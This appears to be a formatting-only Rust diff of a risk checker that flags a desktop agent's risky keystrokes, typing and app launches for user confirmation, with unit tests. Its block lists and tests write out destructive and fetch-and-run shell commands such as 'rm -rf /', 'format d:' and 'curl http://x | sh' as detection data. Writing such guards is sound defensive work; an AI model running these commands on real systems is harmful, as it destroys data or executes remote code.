@@ -18,31 +18,111 @@ pub struct Foreground {
 
 /// Words that, in what an agent says it is doing, mean something hard to undo.
 const HIGH_WORDS: &[&str] = &[
-    "delete", "remove", "erase", "wipe", "uninstall", "format", "destroy", "overwrite", "purchase", "buy", "pay", "checkout",
-    "send", "submit", "post", "publish", "install", "reset", "shutdown", "restart", "password", "credit",
+    "delete",
+    "remove",
+    "erase",
+    "wipe",
+    "uninstall",
+    "format",
+    "destroy",
+    "overwrite",
+    "purchase",
+    "buy",
+    "pay",
+    "checkout",
+    "send",
+    "submit",
+    "post",
+    "publish",
+    "install",
+    "reset",
+    "shutdown",
+    "restart",
+    "password",
+    "credit",
 ];
 
 /// Words in a window's title that suggest a dialog about something irreversible.
 const DIALOG_WORDS: &[&str] = &[
-    "delete", "remove", "uninstall", "format", "erase", "permanently", "purchase", "payment", "checkout", "confirm", "install",
-    "are you sure", "overwrite", "replace", "sign out", "log out",
+    "delete",
+    "remove",
+    "uninstall",
+    "format",
+    "erase",
+    "permanently",
+    "purchase",
+    "payment",
+    "checkout",
+    "confirm",
+    "install",
+    "are you sure",
+    "overwrite",
+    "replace",
+    "sign out",
+    "log out",
 ];
 
-const SHELLS: &[&str] = &["cmd", "powershell", "pwsh", "windowsterminal", "wt", "bash", "wsl", "conhost", "mintty"];
+const SHELLS: &[&str] = &[
+    "cmd",
+    "powershell",
+    "pwsh",
+    "windowsterminal",
+    "wt",
+    "bash",
+    "wsl",
+    "conhost",
+    "mintty",
+];
 
 /// Things that are dangerous to type into a shell.
 const SHELL_DANGER: &[&str] = &[
-    "del ", "erase ", "rm ", "rmdir", "rd ", "format ", "shutdown", "diskpart", "reg delete", "remove-item", "taskkill",
-    "net user", "icacls", "takeown", "cipher /w", "bcdedit", "| sh", "| bash", "iex", "invoke-expression", "invoke-webrequest",
-    "curl ", "wget ",
+    "del ",
+    "erase ",
+    "rm ",
+    "rmdir",
+    "rd ",
+    "format ",
+    "shutdown",
+    "diskpart",
+    "reg delete",
+    "remove-item",
+    "taskkill",
+    "net user",
+    "icacls",
+    "takeown",
+    "cipher /w",
+    "bcdedit",
+    "| sh",
+    "| bash",
+    "iex",
+    "invoke-expression",
+    "invoke-webrequest",
+    "curl ",
+    "wget ",
 ];
 
 /// Programs that can change the whole system, or run arbitrary things.
-const POWER_TOOLS_HIGH: &[&str] = &["regedit", "diskpart", "format", "msiexec", "bcdedit", "gpedit", "secpol", "wmic"];
-const POWER_TOOLS_MEDIUM: &[&str] = &["cmd", "powershell", "pwsh", "wt", "terminal", "taskmgr", "services", "diskmgmt", "compmgmt"];
+const POWER_TOOLS_HIGH: &[&str] = &[
+    "regedit", "diskpart", "format", "msiexec", "bcdedit", "gpedit", "secpol", "wmic",
+];
+const POWER_TOOLS_MEDIUM: &[&str] = &[
+    "cmd",
+    "powershell",
+    "pwsh",
+    "wt",
+    "terminal",
+    "taskmgr",
+    "services",
+    "diskmgmt",
+    "compmgmt",
+];
 
 fn words(text: &str) -> Vec<String> {
-    text.to_lowercase().split(|c: char| !c.is_alphanumeric()).filter(|word| !word.is_empty()).map(str::to_string).collect()
+    text.to_lowercase()
+        .split(|c: char| !c.is_alphanumeric())
+        .filter(|word| !word.is_empty())
+        .map(str::to_string)
+        .collect()
 }
 
 fn contains_phrase(text: &str, phrase: &str) -> bool {
@@ -51,12 +131,17 @@ fn contains_phrase(text: &str, phrase: &str) -> bool {
 
 fn mentions_any(text: &str, list: &[&str]) -> Option<String> {
     let spoken = words(text);
-    list.iter().find(|word| !word.contains(' ') && spoken.iter().any(|spoken| spoken == *word)).map(|word| (*word).to_string())
+    list.iter()
+        .find(|word| !word.contains(' ') && spoken.iter().any(|spoken| spoken == *word))
+        .map(|word| (*word).to_string())
 }
 
 /// Whether an action is harmless by nature: waiting and finishing never ask.
 pub fn is_harmless(action: &Action) -> bool {
-    matches!(action, Action::Wait { .. } | Action::Done { .. } | Action::Scroll { .. } | Action::AskUser { .. })
+    matches!(
+        action,
+        Action::Wait { .. } | Action::Done { .. } | Action::Scroll { .. } | Action::AskUser { .. }
+    )
 }
 
 /// Assesses one action. `reason` is the agent's one-sentence explanation (may be empty).
@@ -67,8 +152,13 @@ pub fn assess(action: &Action, reason: &str, foreground: &Foreground) -> Assessm
     }
 
     // The folder that holds the record of what the agent saw and heard is not the agent's to touch.
-    if foreground.process == "explorer" && contains_phrase(&foreground.title, &crate::archive::FOLDER.to_lowercase()) {
-        result.raise(Risk::High, "This is Rune Studio's own record folder".to_string());
+    if foreground.process == "explorer"
+        && contains_phrase(&foreground.title, &crate::archive::FOLDER.to_lowercase())
+    {
+        result.raise(
+            Risk::High,
+            "This is Rune Studio's own record folder".to_string(),
+        );
     }
 
     // What the agent says it is doing is the cheapest and most reliable signal.
@@ -87,7 +177,10 @@ pub fn assess(action: &Action, reason: &str, foreground: &Foreground) -> Assessm
                 assess_control(&element.name, &mut result);
             }
         }
-        Action::Wait { .. } | Action::Done { .. } | Action::Scroll { .. } | Action::AskUser { .. } => {}
+        Action::Wait { .. }
+        | Action::Done { .. }
+        | Action::Scroll { .. }
+        | Action::AskUser { .. } => {}
     }
     result
 }
@@ -100,7 +193,10 @@ fn assess_keys(keys: &[String], foreground: &Foreground, result: &mut Assessment
     let shift = has("shift");
 
     if alt && has("f4") {
-        result.raise(Risk::High, "Alt+F4 closes the window and can lose unsaved work");
+        result.raise(
+            Risk::High,
+            "Alt+F4 closes the window and can lose unsaved work",
+        );
     }
     if ctrl && alt && (has("delete") || has("del")) {
         result.raise(Risk::High, "Ctrl+Alt+Delete opens the security screen");
@@ -110,7 +206,10 @@ fn assess_keys(keys: &[String], foreground: &Foreground, result: &mut Assessment
     }
     if (has("delete") || has("del")) && !shift {
         if foreground.process == "explorer" {
-            result.raise(Risk::High, "Delete in File Explorer removes the selected files");
+            result.raise(
+                Risk::High,
+                "Delete in File Explorer removes the selected files",
+            );
         } else {
             result.raise(Risk::Medium, "Delete removes what is selected");
         }
@@ -119,33 +218,59 @@ fn assess_keys(keys: &[String], foreground: &Foreground, result: &mut Assessment
         result.raise(Risk::Medium, "Closes the current tab or window");
     }
     // Enter, Space or Y inside a dialog about something irreversible is the same as clicking Yes.
-    if (has("enter") || has("return") || has("space") || has("y")) && dialog_is_dangerous(foreground) {
-        result.raise(Risk::High, format!("Confirms a dialog titled \"{}\"", foreground.title));
+    if (has("enter") || has("return") || has("space") || has("y"))
+        && dialog_is_dangerous(foreground)
+    {
+        result.raise(
+            Risk::High,
+            format!("Confirms a dialog titled \"{}\"", foreground.title),
+        );
     }
 }
 
 fn assess_typing(text: &str, foreground: &Foreground, result: &mut Assessment) {
     if SHELLS.contains(&foreground.process.as_str()) {
         result.raise(Risk::Medium, "Typing into a command line");
-        if let Some(danger) = SHELL_DANGER.iter().find(|danger| contains_phrase(text, danger)) {
-            result.raise(Risk::High, format!("A command that can destroy data or run code (\"{}\")", danger.trim()));
+        if let Some(danger) = SHELL_DANGER
+            .iter()
+            .find(|danger| contains_phrase(text, danger))
+        {
+            result.raise(
+                Risk::High,
+                format!(
+                    "A command that can destroy data or run code (\"{}\")",
+                    danger.trim()
+                ),
+            );
         }
     }
     let title = foreground.title.to_lowercase();
-    if ["password", "sign in", "log in", "login", "credentials"].iter().any(|word| title.contains(word)) {
+    if ["password", "sign in", "log in", "login", "credentials"]
+        .iter()
+        .any(|word| title.contains(word))
+    {
         result.raise(Risk::High, "Typing into a sign-in page");
     }
 }
 
 fn assess_launch(name: &str, result: &mut Assessment) {
     let lowered = name.trim().to_lowercase();
-    let stem = lowered.rsplit(['\\', '/']).next().unwrap_or(&lowered).trim_end_matches(".exe").to_string();
+    let stem = lowered
+        .rsplit(['\\', '/'])
+        .next()
+        .unwrap_or(&lowered)
+        .trim_end_matches(".exe")
+        .to_string();
     if POWER_TOOLS_HIGH.contains(&stem.as_str()) {
         result.raise(Risk::High, format!("{stem} can change the whole system"));
     } else if POWER_TOOLS_MEDIUM.contains(&stem.as_str()) {
         result.raise(Risk::Medium, format!("{stem} can run any command"));
     }
-    let program_file = [".exe", ".msi", ".bat", ".cmd", ".ps1", ".vbs", ".js", ".scr", ".lnk"].iter().any(|ext| lowered.ends_with(ext));
+    let program_file = [
+        ".exe", ".msi", ".bat", ".cmd", ".ps1", ".vbs", ".js", ".scr", ".lnk",
+    ]
+    .iter()
+    .any(|ext| lowered.ends_with(ext));
     if program_file && (lowered.contains('\\') || lowered.contains('/')) {
         result.raise(Risk::High, "Runs a program file from a path");
     }
@@ -153,7 +278,13 @@ fn assess_launch(name: &str, result: &mut Assessment) {
 
 fn assess_click(foreground: &Foreground, result: &mut Assessment) {
     if dialog_is_dangerous(foreground) {
-        result.raise(Risk::Medium, format!("The window \"{}\" asks about something hard to undo", foreground.title));
+        result.raise(
+            Risk::Medium,
+            format!(
+                "The window \"{}\" asks about something hard to undo",
+                foreground.title
+            ),
+        );
     }
 }
 
@@ -175,15 +306,25 @@ mod tests {
     use crate::exec::input::MouseButton;
 
     fn fg(title: &str, process: &str) -> Foreground {
-        Foreground { title: title.into(), process: process.into() }
+        Foreground {
+            title: title.into(),
+            process: process.into(),
+        }
     }
 
     fn keys(list: &[&str]) -> Action {
-        Action::PressKeys { keys: list.iter().map(|key| (*key).into()).collect() }
+        Action::PressKeys {
+            keys: list.iter().map(|key| (*key).into()).collect(),
+        }
     }
 
     fn click() -> Action {
-        Action::Click { x: 500.0, y: 500.0, button: MouseButton::Left, double: false }
+        Action::Click {
+            x: 500.0,
+            y: 500.0,
+            button: MouseButton::Left,
+            double: false,
+        }
     }
 
     fn risk(action: &Action, reason: &str, foreground: &Foreground) -> Risk {
@@ -202,43 +343,108 @@ mod tests {
 
     #[test]
     fn anything_in_the_record_folder_needs_a_yes() {
-        assert_eq!(risk(&click(), "open it", &fg("Rune Studio", "explorer")), Risk::High);
-        assert_eq!(risk(&click(), "open it", &fg("Rune Studio", "notepad")), Risk::Low);
+        assert_eq!(
+            risk(&click(), "open it", &fg("Rune Studio", "explorer")),
+            Risk::High
+        );
+        assert_eq!(
+            risk(&click(), "open it", &fg("Rune Studio", "notepad")),
+            Risk::Low
+        );
     }
 
     #[test]
     fn scrolling_and_asking_never_need_a_yes() {
         use crate::exec::input::ScrollDirection;
-        assert!(is_harmless(&Action::Scroll { x: 500.0, y: 500.0, direction: ScrollDirection::Down, amount: 3 }));
-        assert!(is_harmless(&Action::AskUser { question: "Delete it?".into() }));
-        assert!(!is_harmless(&Action::Drag { from: (0.0, 0.0), to: (10.0, 10.0) }));
+        assert!(is_harmless(&Action::Scroll {
+            x: 500.0,
+            y: 500.0,
+            direction: ScrollDirection::Down,
+            amount: 3
+        }));
+        assert!(is_harmless(&Action::AskUser {
+            question: "Delete it?".into()
+        }));
+        assert!(!is_harmless(&Action::Drag {
+            from: (0.0, 0.0),
+            to: (10.0, 10.0)
+        }));
     }
 
     #[test]
     fn ordinary_actions_are_low_risk() {
         let notepad = fg("Untitled - Notepad", "notepad");
         assert_eq!(risk(&click(), "Click the text area", &notepad), Risk::Low);
-        assert_eq!(risk(&Action::TypeText { text: "hello".into() }, "Type the greeting", &notepad), Risk::Low);
-        assert_eq!(risk(&keys(&["ctrl", "s"]), "Save the file", &notepad), Risk::Low);
-        assert_eq!(risk(&Action::OpenApp { name: "notepad".into() }, "Open Notepad", &Foreground::default()), Risk::Low);
-        assert_eq!(risk(&Action::OpenApp { name: "https://example.com".into() }, "", &Foreground::default()), Risk::Low);
+        assert_eq!(
+            risk(
+                &Action::TypeText {
+                    text: "hello".into()
+                },
+                "Type the greeting",
+                &notepad
+            ),
+            Risk::Low
+        );
+        assert_eq!(
+            risk(&keys(&["ctrl", "s"]), "Save the file", &notepad),
+            Risk::Low
+        );
+        assert_eq!(
+            risk(
+                &Action::OpenApp {
+                    name: "notepad".into()
+                },
+                "Open Notepad",
+                &Foreground::default()
+            ),
+            Risk::Low
+        );
+        assert_eq!(
+            risk(
+                &Action::OpenApp {
+                    name: "https://example.com".into()
+                },
+                "",
+                &Foreground::default()
+            ),
+            Risk::Low
+        );
     }
 
     #[test]
     fn waiting_and_finishing_never_ask() {
         assert!(is_harmless(&Action::Wait { ms: 1000 }));
-        assert!(is_harmless(&Action::Done { summary: "delete everything".into(), success: true }));
-        assert_eq!(risk(&Action::Wait { ms: 10 }, "delete", &fg("Delete files", "explorer")), Risk::Low);
+        assert!(is_harmless(&Action::Done {
+            summary: "delete everything".into(),
+            success: true
+        }));
+        assert_eq!(
+            risk(
+                &Action::Wait { ms: 10 },
+                "delete",
+                &fg("Delete files", "explorer")
+            ),
+            Risk::Low
+        );
     }
 
     #[test]
     fn what_the_agent_says_it_is_doing_counts() {
         let any = fg("Mail", "outlook");
-        for reason in ["Click Delete to remove the file", "Send the email", "Pay for the order", "Install the update", "Wipe the disk"] {
+        for reason in [
+            "Click Delete to remove the file",
+            "Send the email",
+            "Pay for the order",
+            "Install the update",
+            "Wipe the disk",
+        ] {
             assert_eq!(risk(&click(), reason, &any), Risk::High, "{reason}");
         }
         // Whole words only: "sender" or "postal" are not "send" or "post".
-        assert_eq!(risk(&click(), "Open the sender list in the postal app", &any), Risk::Low);
+        assert_eq!(
+            risk(&click(), "Open the sender list in the postal app", &any),
+            Risk::Low
+        );
     }
 
     #[test]
@@ -246,11 +452,17 @@ mod tests {
         let any = fg("Notes", "notepad");
         assert_eq!(risk(&keys(&["alt", "f4"]), "", &any), Risk::High);
         assert_eq!(risk(&keys(&["Alt", "F4"]), "", &any), Risk::High);
-        assert_eq!(risk(&keys(&["ctrl", "alt", "delete"]), "", &any), Risk::High);
+        assert_eq!(
+            risk(&keys(&["ctrl", "alt", "delete"]), "", &any),
+            Risk::High
+        );
         assert_eq!(risk(&keys(&["shift", "delete"]), "", &any), Risk::High);
         assert_eq!(risk(&keys(&["ctrl", "w"]), "", &any), Risk::Medium);
         assert_eq!(risk(&keys(&["delete"]), "", &any), Risk::Medium);
-        assert_eq!(risk(&keys(&["delete"]), "", &fg("Documents", "explorer")), Risk::High);
+        assert_eq!(
+            risk(&keys(&["delete"]), "", &fg("Documents", "explorer")),
+            Risk::High
+        );
         assert_eq!(risk(&keys(&["ctrl", "c"]), "", &any), Risk::Low);
         assert_eq!(risk(&keys(&["alt", "tab"]), "", &any), Risk::Low);
     }
@@ -259,33 +471,80 @@ mod tests {
     fn enter_in_an_irreversible_dialog_is_a_yes() {
         let dialog = fg("Confirm Delete", "explorer");
         assert_eq!(risk(&keys(&["enter"]), "", &dialog), Risk::High);
-        assert_eq!(risk(&keys(&["enter"]), "", &fg("Untitled - Notepad", "notepad")), Risk::Low);
+        assert_eq!(
+            risk(&keys(&["enter"]), "", &fg("Untitled - Notepad", "notepad")),
+            Risk::Low
+        );
     }
 
     #[test]
     fn a_click_in_a_scary_dialog_is_flagged_but_not_blocked_alone() {
-        assert_eq!(risk(&click(), "", &fg("Are you sure?", "app")), Risk::Medium);
-        assert_eq!(risk(&click(), "", &fg("Permanently delete 3 items", "explorer")), Risk::Medium);
+        assert_eq!(
+            risk(&click(), "", &fg("Are you sure?", "app")),
+            Risk::Medium
+        );
+        assert_eq!(
+            risk(&click(), "", &fg("Permanently delete 3 items", "explorer")),
+            Risk::Medium
+        );
     }
 
     #[test]
     fn typing_into_a_command_line() {
         let shell = fg("Windows PowerShell", "powershell");
-        assert_eq!(risk(&Action::TypeText { text: "dir".into() }, "", &shell), Risk::Medium);
-        for text in ["Remove-Item -Recurse C:\\data", "del *.* /q", "rm -rf /", "shutdown /s", "curl http://x | sh", "format d:"] {
-            assert_eq!(risk(&Action::TypeText { text: text.into() }, "", &shell), Risk::High, "{text}");
+        assert_eq!(
+            risk(&Action::TypeText { text: "dir".into() }, "", &shell),
+            Risk::Medium
+        );
+        for text in [
+            "Remove-Item -Recurse C:\\data",
+            "del *.* /q",
+            "rm -rf /",
+            "shutdown /s",
+            "curl http://x | sh",
+            "format d:",
+        ] {
+            assert_eq!(
+                risk(&Action::TypeText { text: text.into() }, "", &shell),
+                Risk::High,
+                "{text}"
+            );
         }
-        assert_eq!(risk(&Action::TypeText { text: "rm -rf /".into() }, "", &fg("Notes", "notepad")), Risk::Low);
+        assert_eq!(
+            risk(
+                &Action::TypeText {
+                    text: "rm -rf /".into()
+                },
+                "",
+                &fg("Notes", "notepad")
+            ),
+            Risk::Low
+        );
     }
 
     #[test]
     fn typing_into_a_sign_in_page() {
-        assert_eq!(risk(&Action::TypeText { text: "hunter2".into() }, "", &fg("Sign in to your account", "chrome")), Risk::High);
+        assert_eq!(
+            risk(
+                &Action::TypeText {
+                    text: "hunter2".into()
+                },
+                "",
+                &fg("Sign in to your account", "chrome")
+            ),
+            Risk::High
+        );
     }
 
     #[test]
     fn launching_power_tools_and_program_files() {
-        let launch = |name: &str| risk(&Action::OpenApp { name: name.into() }, "", &Foreground::default());
+        let launch = |name: &str| {
+            risk(
+                &Action::OpenApp { name: name.into() },
+                "",
+                &Foreground::default(),
+            )
+        };
         assert_eq!(launch("regedit"), Risk::High);
         assert_eq!(launch("REGEDIT.EXE"), Risk::High);
         assert_eq!(launch("cmd"), Risk::Medium);
